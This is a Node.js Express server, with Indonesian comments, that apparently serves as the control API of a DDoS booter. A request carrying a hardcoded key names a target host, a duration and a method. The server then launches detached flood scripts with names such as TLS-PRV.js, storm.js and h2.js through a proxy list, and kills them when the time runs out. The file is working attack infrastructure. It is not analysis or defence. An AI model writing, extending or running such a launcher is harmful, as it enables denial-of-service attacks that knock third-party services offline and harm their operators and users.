const express = require('express');
const { spawn } = require('child_process');
const path = require('path');
const app = express();
const port = 54000;

const scripts = {
    tls: 'TLS-PRV.js',
    ciko: 'HYBRID.js',
    tlss: 'TLS-SILIT.js',
    https: 'HTTPS2.js',
    str: 'storm.js',
    h2: 'h2.js'
};

app.get('/api', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const portNumber = req.query.port;
    const time = Number(req.query.time);
    const method = req.query.method;

    if (key !== 'iki') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!scripts[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    const scriptPath = path.join(__dirname, scripts[method]);

    console.log(`Running ${method}: ${scriptPath}`);

    // GUNAKAN spawn agar bisa kill 1 group (-pid)
    const child = spawn("node", [scriptPath, host, time, 5, 5, "proxy.txt"], {
        detached: true, // MEMBUAT PROCESS GROUP
        stdio: "ignore"
    });

    child.unref(); // biar tidak nempel ke parent

    console.log(`Started method ${method} with PGID: ${child.pid}`);

    res.json({
        status: "running",
        method,
        pid: child.pid,
        host,
        time
    });

    // TIMEOUT
    setTimeout(() => {
        try {
            // KILL GROUP → seluruh anak ikut mati
            process.kill(-child.pid, 'SIGKILL');

            console.log(`Killed all processes for PGID ${child.pid}`);
        } catch (e) {
            console.log(`Process group ${child.pid} already dead.`);
        }
    }, time * 1000);
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
